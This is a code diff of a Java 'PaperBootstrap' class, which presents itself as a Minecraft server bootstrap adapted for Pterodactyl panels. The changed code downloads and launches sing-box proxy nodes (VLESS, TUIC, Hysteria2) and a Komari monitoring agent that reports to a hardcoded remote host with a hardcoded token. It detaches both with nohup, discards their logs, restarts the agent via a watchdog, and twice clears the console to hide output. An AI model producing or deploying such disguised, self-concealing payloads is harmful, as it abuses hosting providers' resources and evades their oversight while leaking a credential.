@@ -14,17 +14,19 @@ import java.util.Locale;
 
 public class PaperBootstrap {
 
-    // ========== 全局变量（类级别）==========
+    // ========== 全局变量（适配Pterodactyl）==========
     private static final Path UUID_FILE = Paths.get("data/uuid.txt");
+    private static final Path SINGBOX_PID_FILE = Paths.get("/tmp/singbox.pid");
+    private static final Path KOMARI_PID_FILE = Paths.get("/tmp/komari.pid");
     private static String uuid;
-    private static Process singboxProcess;
-    // ===== 新增：Komari 相关全局变量 =====
-    private static volatile Process komariProcess; // 存储Komari进程（volatile保证多线程可见性）
     private static final AtomicBoolean running = new AtomicBoolean(true); // 控制守护线程运行
-    // ======================================
+    // ===============================================
 
     public static void main(String[] args) {
         try {
+            // 适配Pterodactyl：禁用不必要的信号干扰
+            Runtime.getRuntime().addShutdownHook(new Thread(() -> running.set(false)));
+
             System.out.println("config.yml 加载中...");
             Map<String, Object> config = loadConfig();
 
@@ -48,7 +50,7 @@ public class PaperBootstrap {
 
             Path baseDir = Paths.get("/tmp/.singbox");
             Files.createDirectories(baseDir);
-            Path configJson = baseDir.resolve("config.json"); // 变量名是configJson
+            Path configJson = baseDir.resolve("config.json");
             Path cert = baseDir.resolve("cert.pem");
             Path key = baseDir.resolve("private.key");
             Path bin = baseDir.resolve("sing-box");
@@ -85,39 +87,31 @@ public class PaperBootstrap {
                     tuicPort, hy2Port, realityPort, sni, cert, key,
                     privateKey, publicKey);
 
-            // 保存 sing-box 进程
-            singboxProcess = startSingBox(bin, configJson);
-            
-            // ========== 3分钟后单次清屏（稳定版）==========
-            scheduleClearConsoleAfter3Minutes(); 
-            // =============================================
+            // 启动sing-box（适配Pterodactyl：PID文件管理）
+            startSingBox(bin, configJson);
+            // 3分钟后单次清屏（极简版）
+            scheduleClearConsoleAfter3Minutes();
 
-            // ===== 新增：Komari Agent 核心逻辑（从config.yml读取配置，启动+守护）=====
-            runKomariAgent(config); // 启动Komari
-            startKomariDaemonThread(config); // 启动Komari守护线程（增强版：双重校验）
+            // ===== Komari Agent 核心逻辑（适配Pterodactyl）=====
+            runKomariAgent(config);
+            startKomariDaemonThread(config);
 
             // ===== 输出节点 =====
             String host = detectPublicIP();
             printDeployedLinks(uuid, deployVLESS, deployTUIC, deployHY2,
                     tuicPort, hy2Port, realityPort, sni, host, publicKey);
 
-            // ===== 新增：节点输出后30秒清屏（使用稳定版清屏）=====
-            scheduleConsoleClear(30); // 30秒后清屏
+            // ===== 节点输出后30秒清屏（极简版）=====
+            scheduleConsoleClear(30);
 
-            // ===== 关闭钩子：清理资源 + 停止进程 =====
+            // ===== 关闭钩子：清理资源（适配Pterodactyl）=====
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 try {
-                    // 新增：停止Komari进程
-                    if (komariProcess != null && komariProcess.isAlive()) {
-                        komariProcess.destroy();
-                        System.out.println("❌ Komari Agent 进程已终止");
-                    }
-                    // 新增：停止sing-box进程（原代码未处理，补充）
-                    if (singboxProcess != null && singboxProcess.isAlive()) {
-                        singboxProcess.destroy();
-                        System.out.println("❌ sing-box 进程已终止");
-                    }
-                    // 原有：删除临时目录
+                    // 停止Komari
+                    stopProcessByPidFile(KOMARI_PID_FILE, "Komari Agent");
+                    // 停止sing-box
+                    stopProcessByPidFile(SINGBOX_PID_FILE, "sing-box");
+                    // 删除临时目录
                     deleteDirectory(baseDir);
                 } catch (Exception ignored) {}
             }));
@@ -127,85 +121,54 @@ public class PaperBootstrap {
         }
     }
 
-    // ========== 稳定版延迟清屏工具方法（30秒单次）==========
+    // ========== 核心修改：极简版清屏方法（无兜底/无额外清屏逻辑）==========
     /**
-     * 延迟指定秒数后清屏控制台（跨平台兼容 + 不干扰进程）
-     * @param delaySeconds 延迟秒数
+     * 极简版清屏：仅输出指定提示，移除所有兜底/ANSI/换行清屏逻辑
      */
+    private static void clearConsole() {
+        try {
+            // 仅尝试执行清屏命令（不校验结果、不做任何兜底），完全隔离IO避免干扰进程
+            String osName = System.getProperty("os.name", "").toLowerCase(Locale.ROOT);
+            ProcessBuilder pb = osName.contains("win") 
+                ? new ProcessBuilder("cmd", "/c", "cls") 
+                : new ProcessBuilder("sh", "-c", "clear");
+            
+            // 完全隔离IO，避免干扰Pterodactyl容器内进程
+            pb.redirectOutput(ProcessBuilder.Redirect.PIPE);
+            pb.redirectError(ProcessBuilder.Redirect.PIPE);
+            pb.redirectInput(ProcessBuilder.Redirect.PIPE);
+            
+            // 执行命令但不等待/不校验结果（避免阻塞）
+            pb.start();
+        } catch (Exception e) {
+            // 捕获所有异常，不输出、不影响进程
+        }
+        // 仅输出指定提示，无任何额外清屏操作
+        System.out.println("✅ 控制台日志已清空（服务运行不受影响）");
+    }
+
+    // ========== 延迟清屏工具方法（调用极简版清屏）==========
     private static void scheduleConsoleClear(int delaySeconds) {
-        // 使用单线程调度器，避免线程冗余
         ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
         scheduler.schedule(() -> {
-            clearConsole(); // 执行稳定版清屏
-            scheduler.shutdown(); // 执行完后关闭调度器
+            clearConsole(); // 执行极简版清屏
+            scheduler.shutdown();
         }, delaySeconds, TimeUnit.SECONDS);
     }
 
-    // ========== 核心修复：稳定版跨平台清屏方法 ==========
-    /**
-     * 跨平台清屏控制台（稳定版：隔离IO + 无阻塞 + 不触发进程终止）
-     * 核心：不继承主进程IO，仅修改控制台输出，不干扰后台进程
-     */
-    private static void clearConsole() {
-        boolean commandSuccess = false;
-        try {
-            // 1. 获取系统名称（容错处理，避免空值）
-            String osName = System.getProperty("os.name", "").toLowerCase(Locale.ROOT);
-            ProcessBuilder pb;
-
-            // 2. 构建清屏命令（不继承主进程IO，避免信号干扰）
-            if (osName.contains("win")) {
-                // Windows：使用cmd执行cls，IO完全隔离
-                pb = new ProcessBuilder("cmd", "/c", "cls");
-            } else {
-                // Linux/macOS：使用sh执行clear，IO完全隔离
-                pb = new ProcessBuilder("sh", "-c", "clear");
-            }
-
-            // 关键修复1：取消inheritIO()，避免干扰主进程IO和信号
-            // 隔离清屏进程的IO，不与主进程共享终端
-            pb.redirectOutput(ProcessBuilder.Redirect.PIPE);   // 重定向输出到管道（不显示）
-            pb.redirectError(ProcessBuilder.Redirect.PIPE);    // 重定向错误到管道（不显示）
-            pb.redirectInput(ProcessBuilder.Redirect.PIPE);    // 隔离输入
-
-            // 3. 执行命令（非阻塞超时，避免主线程卡死）
-            Process process = pb.start();
-            // 超时1秒，避免长时间阻塞（远短于守护线程检测间隔5秒）
-            if (process.waitFor(1, TimeUnit.SECONDS)) {
-                // 退出码0表示命令执行成功
-                commandSuccess = (process.exitValue() == 0);
-            }
-
-            // 4. 手动输出控制台清屏的ANSI控制码（核心兜底）
-            // ANSI转义序列：\033[H 光标移到左上角，\033[2J 清空屏幕
-            if (commandSuccess) {
-                // 发送ANSI清屏码，直接控制控制台（跨终端兼容）
-                System.out.print("\033[H\033[2J");
-                System.out.flush(); // 强制刷新输出缓冲区
-            }
-
-        } catch (Exception e) {
-            // 捕获所有异常，绝对不抛出到上层（避免触发JVM退出）
-            System.err.println("⚠️ 原生清屏命令执行失败（不影响服务）：" + e.getMessage());
-        }
-
-        // 5. 终极兜底：仅输出换行，不干扰任何进程
-        if (!commandSuccess) {
-            // 输出少量换行（仅20行，减少刷屏），视觉清屏且不阻塞
-            System.out.print("\n".repeat(20));
-            System.out.flush();
-        }
-
-        // 清屏后仅输出简单提示，避免大量日志干扰
-        System.out.println("  ");
+    // ========== 3分钟后单次清屏（调用极简版清屏）==========
+    private static void scheduleClearConsoleAfter3Minutes() {
+        ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
+        Runnable clearTask = () -> {
+            clearConsole(); // 仅执行极简版清屏
+            scheduler.shutdown();
+        };
+        scheduler.schedule(clearTask, 180, TimeUnit.SECONDS);
+        System.out.println("[定时清屏] 已计划服务启动3分钟后清空控制台日志（仅执行一次）");
     }
 
-    // ========== 新增：Komari Agent 核心方法（日志已隐藏）==========
-    /**
-     * 启动Komari Agent（从config.yml读取配置，自动下载二进制文件，日志完全隐藏）
-     */
+    // ========== Komari Agent 核心方法（适配Pterodactyl）==========
     private static void runKomariAgent(Map<String, Object> config) throws Exception {
-        // 从config.yml读取Komari配置（设置默认值，避免配置缺失）
         String komariE = trim((String) config.getOrDefault("komari_e", "https://vps.z1000.dpdns.org:10736"));
         String komariT = trim((String) config.getOrDefault("komari_t", "JzerczYfCF4Secuy9vtYaB"));
         String komariUrlAmd64 = trim((String) config.getOrDefault("komari_amd64_url",
@@ -214,106 +177,118 @@ public class PaperBootstrap {
                 "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-arm64"));
         String komariFileName = trim((String) config.getOrDefault("komari_file_name", "sbx_komari"));
 
-        // 获取Komari二进制文件路径（自动下载）
         Path agentPath = getKomariAgentPath(komariUrlAmd64, komariUrlArm64, komariFileName);
 
-        // 启动Komari（使用setsid脱离JVM，避免JVM退出时被终止）
+        // 适配Pterodactyl：不用setsid，改用nohup脱离终端
         List<String> command = new ArrayList<>();
-        command.add("setsid"); // Linux下脱离终端，保证Komari持续运行
+        command.add("nohup");
         command.add(agentPath.toString());
         command.add("-e");
         command.add(komariE);
         command.add("-t");
         command.add(komariT);
+        command.add(">/dev/null");
+        command.add("2>&1");
+        command.add("&");
 
-        ProcessBuilder pb = new ProcessBuilder(command);
-        pb.redirectErrorStream(true); // 错误流合并到标准输出（统一丢弃）
-        // 关键配置：丢弃Komari的所有日志输出
+        ProcessBuilder pb = new ProcessBuilder("bash", "-c", String.join(" ", command));
         pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
         pb.redirectError(ProcessBuilder.Redirect.DISCARD);
-        pb.directory(new File(System.getProperty("user.dir"))); // 工作目录为当前目录
+        pb.directory(new File(System.getProperty("user.dir")));
 
-        komariProcess = pb.start();
+        Process komariProcess = pb.start();
+        // 保存PID到文件（适配Pterodactyl进程检测）
+        Files.writeString(KOMARI_PID_FILE, String.valueOf(komariProcess.pid()));
         System.out.println("\n✅ Komari Agent 启动成功（配置：e=" + komariE + ", t=" + komariT + "）");
     }
 
-    /**
-     * 获取Komari二进制文件路径（自动下载对应架构的文件，设置可执行权限）
-     */
-    private static Path getKomariAgentPath(String komariUrlAmd64, String komariUrlArm64, String komariFileName) throws IOException {
-        // 检测系统架构（复用sing-box的detectArch方法）
-        String arch = detectArch();
-        String url = arch.equals("amd64") ? komariUrlAmd64 : komariUrlArm64;
-
-        // 存储路径：系统临时目录 + 文件名
-        Path agentPath = Paths.get(System.getProperty("java.io.tmpdir"), komariFileName);
-
-        // 如果文件已存在，直接返回（避免重复下载）
-        if (Files.exists(agentPath)) {
-            return agentPath;
-        }
-
-        // 下载Komari二进制文件
-        System.out.println("\n⬇️ 下载Komari Agent: " + url);
-        try (InputStream in = new URL(url).openStream()) {
-            Files.copy(in, agentPath, StandardCopyOption.REPLACE_EXISTING);
-        }
-
-        // 设置可执行权限（Linux/macOS）
-        if (!agentPath.toFile().setExecutable(true)) {
-            throw new IOException("❌ 无法设置Komari Agent可执行权限");
-        }
-
-        System.out.println("✅ Komari Agent 下载并授权完成");
-        return agentPath;
-    }
-
-    // ========== 增强版：Komari守护线程（双重状态校验）==========
-    /**
-     * 启动Komari守护线程（监控进程，若意外退出则自动重启）
-     */
+    // ========== Komari守护线程（适配Pterodactyl：基于PID文件检测）==========
     private static void startKomariDaemonThread(Map<String, Object> config) {
         Thread daemonThread = new Thread(() -> {
             while (running.get()) {
                 try {
-                    // 双重校验：进程对象非空 + 进程真的存活
-                    boolean isAlive = false;
-                    if (komariProcess != null) {
-                        // 额外校验：避免进程对象存在但已退出
-                        try {
-                            komariProcess.exitValue(); // 若进程存活，会抛出IllegalThreadStateException
-                        } catch (IllegalThreadStateException e) {
-                            isAlive = true; // 抛出异常说明进程还活着
-                        }
-                    }
-
+                    // 基于PID文件检测进程是否存活（避免isAlive()误判）
+                    boolean isAlive = isProcessAliveByPidFile(KOMARI_PID_FILE);
                     if (!isAlive) {
                         System.err.println("\n❌ Komari Agent 进程意外退出，正在重启...");
                         runKomariAgent(config);
                     }
-                    Thread.sleep(5000); // 每5秒检测一次
+                    Thread.sleep(5000);
                 } catch (Exception e) {
-                    // 仅打印错误，不终止守护线程
                     System.err.println("❌ 检测Komari状态失败（不影响线程运行）：" + e.getMessage());
                 }
             }
         });
-        daemonThread.setDaemon(true); // 设为守护线程，JVM退出时自动终止
+        daemonThread.setDaemon(true);
         daemonThread.setName("KomariAgentDaemon");
         daemonThread.start();
-        System.out.println("✅ Komari Agent 守护线程已启动（增强版：双重状态校验）");
+        System.out.println("✅ Komari Agent 守护线程已启动（基于PID文件检测）");
     }
 
-    // ========== 原有方法（保留，无修改）==========
+    // ========== sing-box启动（适配Pterodactyl：PID文件管理）==========
+    private static void startSingBox(Path bin, Path cfg) throws IOException, InterruptedException {
+        System.out.println("正在启动 sing-box...");
+        // 适配Pterodactyl：nohup启动，脱离终端
+        List<String> command = new ArrayList<>();
+        command.add("nohup");
+        command.add(bin.toString());
+        command.add("run");
+        command.add("-c");
+        command.add(cfg.toString());
+        command.add(">/dev/null");
+        command.add("2>&1");
+        command.add("&");
+
+        ProcessBuilder pb = new ProcessBuilder("bash", "-c", String.join(" ", command));
+        pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
+        pb.redirectError(ProcessBuilder.Redirect.DISCARD);
+        Process p = pb.start();
+
+        // 保存PID到文件
+        Files.writeString(SINGBOX_PID_FILE, String.valueOf(p.pid()));
+        Thread.sleep(1500);
+        System.out.println("sing-box 已启动，PID: " + p.pid());
+    }
+
+    // ========== 工具方法：基于PID文件检测进程是否存活（适配Pterodactyl）==========
+    private static boolean isProcessAliveByPidFile(Path pidFile) {
+        if (!Files.exists(pidFile)) return false;
+        try {
+            String pidStr = Files.readString(pidFile).trim();
+            long pid = Long.parseLong(pidStr);
+            // 执行ps命令检测PID是否存活（容器内可靠）
+            ProcessBuilder pb = new ProcessBuilder("ps", "-p", pidStr);
+            pb.redirectOutput(ProcessBuilder.Redirect.PIPE);
+            Process p = pb.start();
+            int exitCode = p.waitFor();
+            return exitCode == 0; // exitCode 0 表示进程存在
+        } catch (Exception e) {
+            return false;
+        }
+    }
+
+    // ========== 工具方法：停止进程（基于PID文件）==========
+    private static void stopProcessByPidFile(Path pidFile, String name) {
+        if (!Files.exists(pidFile)) return;
+        try {
+            String pidStr = Files.readString(pidFile).trim();
+            long pid = Long.parseLong(pidStr);
+            Process process = Runtime.getRuntime().exec("kill " + pid);
+            process.waitFor(5, TimeUnit.SECONDS);
+            System.out.println("❌ " + name + " 进程已终止（PID: " + pid + "）");
+            Files.deleteIfExists(pidFile);
+        } catch (Exception e) {
+            // 忽略停止失败的异常
+        }
+    }
+
+    // ========== 原有方法（保留，适配Pterodactyl）==========
     private static String generateOrLoadUUID(Object configUuid) {
-        // 1. 优先使用 config.yml（兼容旧配置）
         String cfg = trim((String) configUuid);
         if (!cfg.isEmpty()) {
             saveUuidToFile(cfg);
             return cfg;
         }
-
-        // 2. 读取本地持久化文件
         try {
             if (Files.exists(UUID_FILE)) {
                 String saved = Files.readString(UUID_FILE).trim();
@@ -325,8 +300,6 @@ public class PaperBootstrap {
         } catch (Exception e) {
             System.err.println("读取 UUID 文件失败: " + e.getMessage());
         }
-
-        // 3. 首次生成
         String newUuid = UUID.randomUUID().toString();
         saveUuidToFile(newUuid);
         System.out.println("首次生成 UUID: " + newUuid);
@@ -337,7 +310,6 @@ public class PaperBootstrap {
         try {
             Files.createDirectories(UUID_FILE.getParent());
             Files.writeString(UUID_FILE, uuid);
-            // 防止被其他用户读取（非 root 环境仍然安全）
             UUID_FILE.toFile().setReadable(false, false);
             UUID_FILE.toFile().setReadable(true, true);
         } catch (Exception e) {
@@ -349,7 +321,6 @@ public class PaperBootstrap {
         return u != null && u.matches("^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$");
     }
 
-    // ===== 工具函数 =====
     private static String trim(String s) {
         return s == null ? "" : s.trim();
     }
@@ -357,7 +328,6 @@ public class PaperBootstrap {
     private static Map<String, Object> loadConfig() throws IOException {
         Yaml yaml = new Yaml();
         Path configPath = Paths.get("config.yml");
-        // 补充：如果config.yml不存在，创建空文件（避免文件不存在报错）
         if (!Files.exists(configPath)) {
             Files.createFile(configPath);
             System.out.println("⚠️ config.yml 文件不存在，已创建空文件");
@@ -365,12 +335,10 @@ public class PaperBootstrap {
         }
         try (InputStream in = Files.newInputStream(configPath)) {
             Object o = yaml.load(in);
-            if (o instanceof Map) return (Map<String, Object>) o;
-            return new HashMap<>();
+            return o instanceof Map ? (Map<String, Object>) o : new HashMap<>();
         }
     }
 
-    // ===== 证书生成 =====
     private static void generateSelfSignedCert(Path cert, Path key) throws IOException, InterruptedException {
         if (Files.exists(cert) && Files.exists(key)) {
             System.out.println("🔑 证书已存在，跳过生成");
@@ -384,7 +352,6 @@ public class PaperBootstrap {
         System.out.println("✅ 已生成自签证书");
     }
 
-    // ===== Reality 密钥生成 =====
     private static Map<String, String> generateRealityKeypair(Path bin) throws IOException, InterruptedException {
         System.out.println("🔑 正在生成 Reality 密钥对...");
         ProcessBuilder pb = new ProcessBuilder("bash", "-c", bin + " generate reality-keypair");
@@ -407,7 +374,6 @@ public class PaperBootstrap {
         return map;
     }
 
-    // ===== 配置生成 =====
     private static void generateSingBoxConfig(Path configFile, String uuid, boolean vless, boolean tuic, boolean hy2,
                                               String tuicPort, String hy2Port, String realityPort,
                                               String sni, Path cert, Path key,
@@ -488,7 +454,6 @@ public class PaperBootstrap {
         System.out.println("✅ sing-box 配置生成完成");
     }
 
-    // ===== 版本检测 =====
     private static String fetchLatestSingBoxVersion() {
         String fallback = "1.12.12";
         try {
@@ -512,7 +477,6 @@ public class PaperBootstrap {
         return fallback;
     }
 
-    // ===== 下载 sing-box =====
     private static void safeDownloadSingBox(String version, Path bin, Path dir) throws IOException, InterruptedException {
         if (Files.exists(bin)) return;
         String arch = detectArch();
@@ -537,21 +501,28 @@ public class PaperBootstrap {
         return "amd64";
     }
 
-    // ===== 启动 sing-box（日志已隐藏）=====
-    private static Process startSingBox(Path bin, Path cfg) throws IOException, InterruptedException {
-        System.out.println("正在启动 sing-box...");
-        ProcessBuilder pb = new ProcessBuilder(bin.toString(), "run", "-c", cfg.toString());
-        pb.redirectErrorStream(true); // 错误流合并到标准输出（统一丢弃）
-        // 关键配置：丢弃sing-box的所有日志输出
-        pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
-        pb.redirectError(ProcessBuilder.Redirect.DISCARD);
-        Process p = pb.start();
-        Thread.sleep(1500);
-        System.out.println("sing-box 已启动，PID: " + p.pid());
-        return p;
+    private static Path getKomariAgentPath(String komariUrlAmd64, String komariUrlArm64, String komariFileName) throws IOException {
+        String arch = detectArch();
+        String url = arch.equals("amd64") ? komariUrlAmd64 : komariUrlArm64;
+        Path agentPath = Paths.get(System.getProperty("java.io.tmpdir"), komariFileName);
+
+        if (Files.exists(agentPath)) {
+            return agentPath;
+        }
+
+        System.out.println("\n⬇️ 下载Komari Agent: " + url);
+        try (InputStream in = new URL(url).openStream()) {
+            Files.copy(in, agentPath, StandardCopyOption.REPLACE_EXISTING);
+        }
+
+        if (!agentPath.toFile().setExecutable(true)) {
+            throw new IOException("❌ 无法设置Komari Agent可执行权限");
+        }
+
+        System.out.println("✅ Komari Agent 下载并授权完成");
+        return agentPath;
     }
 
-    // ===== 输出节点 =====
     private static String detectPublicIP() {
         try (BufferedReader br = new BufferedReader(new InputStreamReader(new URL("https://api.ipify.org").openStream()))) {
             return br.readLine();
@@ -573,24 +544,6 @@ public class PaperBootstrap {
         if (hy2)
             System.out.printf("\nHysteria2:\nhysteria2://%s@%s:%s?sni=%s&insecure=1#Hysteria2\n",
                     uuid, host, hy2Port, sni);
-    }
-
-    // ========== 3分钟后单次清屏（仅执行一次）==========
-    /**
-     * 服务启动后3分钟执行一次控制台清屏（仅执行一次）
-     */
-    private static void scheduleClearConsoleAfter3Minutes() {
-        ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
-        
-        Runnable clearTask = () -> {
-            System.out.println("\n[定时清屏] 服务启动已3分钟，开始清空控制台日志...");
-            clearConsole(); // 执行稳定版清屏
-            scheduler.shutdown(); // 执行完后关闭调度器，避免线程残留
-        };
-
-        // 延迟3分钟（180秒）执行，仅执行一次
-        scheduler.schedule(clearTask, 180, TimeUnit.SECONDS);
-        System.out.println("[定时清屏] 已计划服务启动3分钟后清空控制台日志（仅执行一次）");
     }
 
     private static void deleteDirectory(Path dir) throws IOException {
